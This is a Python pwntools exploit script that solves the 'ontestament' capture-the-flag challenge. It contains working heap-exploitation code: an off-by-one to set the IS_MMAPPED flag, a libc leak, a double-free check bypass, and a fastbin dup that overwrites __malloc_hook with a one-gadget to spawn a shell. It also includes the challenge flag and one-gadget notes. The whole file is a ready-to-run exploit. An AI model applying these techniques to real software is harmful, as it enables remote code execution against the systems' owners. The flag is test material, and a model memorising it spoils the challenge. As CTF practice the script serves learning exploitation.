#!/usr/bin/python3.7
from pwn import *

elf = context.binary = ELF("./ontestament")
libc = elf.libc
context.terminal = ['tilix', '-a', 'app-new-session', '-e']
gs = '''
init-pwndbg
c
'''

# wrapper functions
def sl(x): io.sendline(x)
def sla(x, y): io.sendlineafter(x, y)
def se(x): io.send(x)
def sa(x, y): io.sendafter(x, y)
def ru(x): return io.recvuntil(x)
def rl(): return io.recvline()
def cl(): io.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))


def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))


HOST = args.HOST or 'onetestament.insomnihack.ch'
PORT = args.PORT or 6666


def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        return remote(HOST, PORT)
    else:
        return process(elf.path)


io = run()

# =-=-=-= helper functions -=-=-=-
index = 0

# My new testament
def create(type, content, leak=False):
    global index
    sla(b'choice: ', b'1')
    sla(b'choice: ', str(type).encode())
    sla(b'content: ', content)
    ru('testament: ')
    rl()
    new_testament = rl()
    index = index + 1
    if leak:
        return index - 1, new_testament
    return index - 1

# Edit my testament
def edit(idx, content):
    sla(b'choice: ', b'3')
    sla(b'index: ', str(idx).encode())
    sla(b'content: ', content)


def delete(idx, overflow=False):
    sla(b'choice: ', b'4')
    # overflow optionBuf to bypass double-free check
    if overflow:
        payload = str(idx).encode()
        payload = payload.rjust(5, b'0')
        log.info(f'Bypassing double-free check with: {payload}')
        sla(b'index: ', payload)
    else:
        sla(b'index: ', str(idx).encode())


# =-=-=-=-= Main Exploit -=-=-==-=-=-=-=-=-===-=====

# =-=-=- Set IS_MMAPPED_FLAG =-=-=-

# Create 0x20-sized chunk to overflow
overflow = create(1, 'overflow')

# create 0x90-sized chunk to leak and free it into unsortedbin
# create 0x70-sized top chunk guard to protect against consolidation and use later for fastbin dup
leaker = create(4, 'leaker')
guard = create(3, 'guard')
delete(leaker)

# Set IS_MMAPPED
edit(overflow, '24')

# Assign new 0x90-sized chunk and leak libc
# we're leaking unsortedbin BK (NOT fd)
leaker, libc_leak = create(4, 'leakerr', leak=True)
libc_leak = uu64(libc_leak.strip())
libc.address = libc_leak - 0x3c4b78
log_addr('Libc leak', libc_leak)
log_addr('Libc base', libc.address)

# =-=-=- Fastbin-dup =-=-=-
# Assign 0x70-sized chunk
dup = create(3, 'dup')
log.info(f'dup index: {dup}')

# double free
delete(dup)
delete(guard)
delete(dup, overflow=True)
pause()
# Get pointer to fake 0x70-sized chunk near __malloc_hook
create(3, p64(libc.sym.__malloc_hook - 0x23))
create(3, 'junk')
create(3, 'junk')

# overwrite _malloc_hook
create(3, p8(0) * 0x13 + p64(libc.address + 0x4527a))

# trigger
sla(b'choice: ', b'1')
sla(b'choice: ', b'1')

# =-=-=-==-=-=-=-=-=
io.interactive()
# INS{0ld_7r1ck5_4r3_7h3_b357} 

# =-=-=-=-= Notes -=-=-=
# - Edit just increases one byte in a chunk based on an offset. This is limited to the size of the chunk; we can supply the actual size of the chunk to get an off-by-one write and increase the size of the next chunk's size
# - We can use the above ONCE to set the IS_MMAPPED_FLAG so calloc will ignore.
# - Fastbin dup
#   - Defete double-free fake protection by overflowing optionBuf into doubleFreeCheck4, meaning we can only double-free 5th chunk which is convenient because we use 4 allocations to leak libc. We use '00004' to overflow and bypass check, and still free chunk with index 4.
#   - Type 3 (child testament) creates 0x70-sized chunk

# One gadgets
# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
